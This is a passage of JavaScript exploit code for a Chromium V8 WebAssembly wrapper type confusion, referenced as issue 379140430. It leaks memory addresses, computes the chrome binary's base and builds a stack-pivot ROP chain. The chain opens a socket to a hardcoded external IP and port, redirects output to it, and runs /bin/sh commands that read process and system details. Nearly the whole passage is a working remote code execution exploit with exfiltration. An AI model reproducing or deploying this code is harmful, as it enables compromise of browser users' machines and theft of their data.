    slog('corrupt=' + c0 + ',' + c1 + ' t0=' + t0[0].toString(16) + ' t1=' + t1[0].toString(16) +
         ' b=' + bAddr.toString(16) + ' c=' + cAddr.toString(16));
  }
  // TIER-UP with the corruption ACTIVE (the wrapper re-reads the corrupted
  // Tuple2 origin at tier-up - that IS the confusion, Chromium 379140430).
  // Tier-onset detection: pre-tier vr receives 2 args (Vread sig), post-tier
  // 30 (Sread); pre-tier vw receives 1 arg (Vwrite), post-tier 0 (Swrite).
  // Stop at onset so only a couple of result-smears ever hit the stack.
  try {
    const cg = window.__instB.exports.callg, cw = window.__instB.exports.callw;
    const ag = Array.from({length: NP}, (_,i)=> 1.5);
    let vrTiered = false;
    // install window: let pending background wrapper rebuilds land BEFORE the
    // cw loop (a rebuild landing mid-cw = first post-tier callw smears the
    // return path and wedges; 21:15-22:15 grids: 0/212 armed without this)
    await new Promise(r => setTimeout(r, 200));
    for (let i = 0; i < 8000; i++) {
      try { cg.apply(null, ag); } catch(e) { slog('cg err ' + i + ': ' + e); break; }
    }
    if (vrSeen && vrSeen.length === NP) vrTiered = true;
    await new Promise(r => setTimeout(r, 100));
    // cw loop REMOVED: its post-tier callw smears wedge the target renderer
    // before 'tiered' (V run 04:49 stopped at corrupt). cg + a longer fire
    // loop drive the shared wrapper rebuild instead.
    slog('tiered vrTiered=' + vrTiered + ' gr=' + window.__grN + ' vwArgN=' + vwArgN);
    
    await new Promise(r => setTimeout(r, 30));
  } catch (e) { slog('tier: ' + e); }
  // fire_read itself drives the direct-import wrapper tier-up: loop until the
  // wrapper rebuilds with the corrupted (Sread) origin - vr then sees 30 args.
  try {
    let got = null;
    slog('frloop-go');
    for (let i = 0; i < 4000; i++) {
      vrSeen = null;
      try { window.__instB.exports.fire_read(); } catch(e) { slog('fr err ' + i + ': ' + e); break; }
      if ((i % 500) === 0) slog('fr' + i + ' n=' + (vrSeen ? vrSeen.length : -1));
      if (vrSeen && vrSeen.length === NP) { got = i; break; }
    }
    slog('CONFUSED vr args=' + (vrSeen ? vrSeen.length : -1) + ' att=' + got + ' :: ' + (vrSeen ? vrSeen.slice(0, Math.min(NP, 30)).join(',') : 'null'));
  } catch (e) { slog('fire: ' + e); }
  // ==== PHASE C: stack-pivot ROP via fire_write ====
  // leak slot12 = chrome r-xp + 0x40e244a (same-run maps correlation, runA);
  // PIE base = leak12 - 0x40e244a - 0x2b5d000 (r-xp maps file 0x2b5c000 at vaddr 0x2b5d000)
  try {
    if (!vrSeen || vrSeen.length !== NP) { slog('rop: no leak'); }
    else {
      const w64 = (str) => { const h = parseInt(str.slice(0, str.indexOf(':')), 16), l = parseInt(str.slice(str.indexOf(':') + 1), 16); return [h, l]; };
      // PIE derivation with slot-drift self-healing: sweep all leak slots
      // against the two runA-measured chrome-text constants and accept only
      // a PAGE-ALIGNED result; majority vote on the high half.
      const CONSTS = [0x40e244a + 0x2b5d000, 0x406fb93 + 0x2b5d000];
      const votes = {};
      let best = null, bestN = 0;
      for (let si = 0; si < vrSeen.length; si++) {
        const w = w64(vrSeen[si]);
        if (w[0] < 0x5000 || w[0] > 0x7000) continue;   // PIE mmap range
        for (let ci = 0; ci < CONSTS.length; ci++) {
          let lo2 = (w[1] - CONSTS[ci]) >>> 0;
          let hi2 = w[0] - (((w[1] < CONSTS[ci]) ? 1 : 0));
          if ((lo2 & 0xfff) === 0) {
            const key = hi2.toString(16) + ':' + lo2.toString(16);
            votes[key] = (votes[key] || 0) + 1;
          }
        }
      }
      for (const k in votes) if (votes[k] > bestN) { bestN = votes[k]; best = k; }
      if (!best || bestN < 2) { slog('rop: no pie slot12=' + vrSeen[12] + ' s19=' + vrSeen[19] + ' s0=' + vrSeen[0]); }
      const bp = best ? best.split(':') : ['0', '0'];
      const PIEl = parseInt(bp[1], 16) >>> 0;
      const PIEh = parseInt(bp[0], 16) >>> 0;
      slog('rop pie=' + PIEh.toString(16) + ':' + PIEl.toString(16) + ' votes=' + bestN + ' L12=' + vrSeen[12] + ' L19=' + vrSeen[19]);
      const G = (off) => mk((PIEl + off) >>> 0, (PIEh + (((PIEl + off) > 0xffffffff) ? 1 : 0)) >>> 0);
      // gadget doubles (PIE + vaddr)
      const POP_RDI = G(0x2c4a2d8), POP_RSI = G(0x2c4ef74), POP_RDX = G(0x2c47482),
            POP_RAX = G(0x2bd39fc), SYSCALL = G(0x4155417), XCHG = G(0x2bf27e2),
            POP_RSP = G(0x2b87f96), RET = G(0x2c4a2d9);
      slog('rop pie=' + PIEh.toString(16) + ':' + PIEl.toString(16));
      const chain = ROPCHAIN;
      let ropR = reAnchor();
      if (!ropR) {
        const r4 = calibrate(3);
        slog('rop recalib att=' + r4);
        ropR = r4 >= 0 && reAnchor();
      }
      if (!ropR) { slog('rop: reanchor fail'); }
      else {
        const ca = addrof(chain);
        const hd = arbR64(((ca & ~1) + 8) >>> 0);
        const fh = b2f(hd);
        const elems = lo(fh) >>> 0;
        if ((elems & 1) !== 1) { slog('rop: bad elems ' + elems.toString(16)); }
        else {
          // chain data address as [hi,lo] (cage base high half from leak slot9)
          const C = [parseInt(vrSeen[9].slice(0, vrSeen[9].indexOf(':')), 16), ((elems & ~1) + 8) >>> 0];
          const CA = (slot) => { const lo2 = (C[1] + slot * 8) >>> 0; const hi2 = C[0] + (((C[1] + slot * 8) > 0xffffffff) ? 1 : 0); return mk(lo2, hi2); };
          // sockaddr: AF_INET(2) | port 19707 BE | 157.245.82.101
          const SOCK = mk(0x4d1b0002, 0x6552f59d);
          const BINSH = mk(0x6e69622f, 0x0068732f); // "/bin/sh\0"
          const DASHC = mk(0x0000632d, 0);          // "-c\0"
          const CMD   = mk(0x32206469, 0x0031267e); // "id 2>&1\0"
          const chainSet = (i, v) => { chain[i] = v; };
          // chain (executes after pivot; rsp = C data start)
          let k = 0;
          chainSet(k++, POP_RDI); chainSet(k++, mk(2, 0));
          chainSet(k++, POP_RSI); chainSet(k++, mk(1, 0));
          chainSet(k++, POP_RDX); chainSet(k++, mk(0, 0));
          chainSet(k++, POP_RAX); chainSet(k++, mk(41, 0));
          chainSet(k++, SYSCALL);
          chainSet(k++, XCHG);                       // rdi = fd (runtime value)
          chainSet(k++, POP_RSI); chainSet(k++, CA(40));
          chainSet(k++, POP_RDX); chainSet(k++, mk(16, 0));
          chainSet(k++, POP_RAX); chainSet(k++, mk(42, 0));
          chainSet(k++, SYSCALL);
          chainSet(k++, POP_RSI); chainSet(k++, mk(1, 0));
          chainSet(k++, POP_RAX); chainSet(k++, mk(33, 0));
          chainSet(k++, SYSCALL);                    // dup2(fd,1)
          chainSet(k++, POP_RDI); chainSet(k++, CA(41));
          chainSet(k++, POP_RSI); chainSet(k++, CA(44));
          chainSet(k++, POP_RDX); chainSet(k++, mk(0, 0));
          chainSet(k++, POP_RAX); chainSet(k++, mk(59, 0));
          chainSet(k++, SYSCALL);                    // execve("/bin/sh", argv, 0)
          chainSet(40, SOCK);
          chainSet(41, BINSH);
          chainSet(42, DASHC);
          // enriched PoC command (single /bin/sh -c, bounded): id, uname,
          // renderer PID, /proc/self/status ids+ppid, cmdline. Written as
          // 8-byte doubles from slot 50; argv[2] -> slot 50.
          const CMDS = 'id; uname -a; echo PID=$$; grep -E "Name|Pid|PPid|Uid|Gid|TracerPid" /proc/self/status; echo CMD:; tr "\\0" "@" </proc/self/cmdline; echo\\u0000';
          for (let ci2 = 0; ci2 * 8 < CMDS.length; ci2++) {
            let lo2 = 0, hi2 = 0;
            for (let b = 0; b < 4; b++) lo2 |= (CMDS.charCodeAt(ci2 * 8 + b) || 0) << (8 * b);
            for (let b = 0; b < 4; b++) hi2 |= (CMDS.charCodeAt(ci2 * 8 + 4 + b) || 0) << (8 * b);
            chainSet(50 + ci2, mk(lo2 >>> 0, hi2 >>> 0));
          }
          chainSet(44, CA(41)); chainSet(45, CA(42)); chainSet(46, CA(50)); chainSet(47, mk(0, 0));
          // smear payload: [pop rsp;ret, chainAddr] pairs; #v=1 => leading ret
          const variant = parseInt((location.hash.match(/v=(\d+)/) || [0, 4])[1], 10);
          const payload = ROPPAY;
          // pre-armed beacon (BEFORE any address capture): zero allocations are
          // allowed between chainAddr capture and fire_write
          slog('rop arming var=' + variant + ' s=' + ((location.hash.match(/s=(\d+)/) || [0, -1])[1]) + ' p=' + ((location.hash.match(/p=(\d+)/) || [0, -1])[1]) + ' chain@' + C[0].toString(16) + ':' + C[1].toString(16) + ' k=' + k);
          for (let i = 0; i < NP; i++) payload[i] = mk(0, 0);
          if (variant === 9) {
            for (let i = 0; i < NP; i++) payload[i] = mk(i, 0xAAAA00 + (i >> 4));
          } else if (variant === 3) {
            const ps = parseInt((location.hash.match(/s=(\d+)/) || [0, 0])[1], 10);
            if (ps >= 0 && ps < NP) payload[ps] = mk(0x41414141, 0x41414141);
          } else if (variant === 4) {
            // TRUE RET-SLED: slots 0..27 = ret gadget, 28 = pop rsp;ret,
            // 29 = chainAddr. RIP landing anywhere in 0..28 sleds or pivots
            // to the chain (29/30 coverage vs 15/30 for pivot pairs).
            for (let i = 0; i < NP; i++) payload[i] = RET;
            payload[NP - 2] = POP_RSP;
            payload[NP - 1] = CA(0);
            slog('sled28');
          } else {
            for (let i = 0; i < NP; i++) payload[i] = i % 2 === (variant ? 1 : 0) ? POP_RSP : CA(0);
            if (variant) payload[0] = RET;
          }
          VW_PAYLOAD = payload;
          try { window.__instB.exports.fire_write(); slog('rop fired'); }
          catch (e) { slog('rop fire err: ' + e); }
          slog('rop survived');
        }
      }
    }
  } catch (e) { slog('rop: ' + e); }
  window.__result = JSON.stringify({
    ok: ok1 && ok2, pairIdx: pairIdx,
    viewBaseAbs: viewBaseAbs.toString(16), el0Off: el0Off, corrOff: corrOff,
    jsarrMap: jsarrMap.toString(16), ok1: ok1, ok2: ok2, log: LOG.slice(-16)
  });
  } catch (e) {
    window.__result = 'ERR:' + (e && e.stack ? e.stack : String(e));
    slog('ERR ' + String(e));
  }
})();
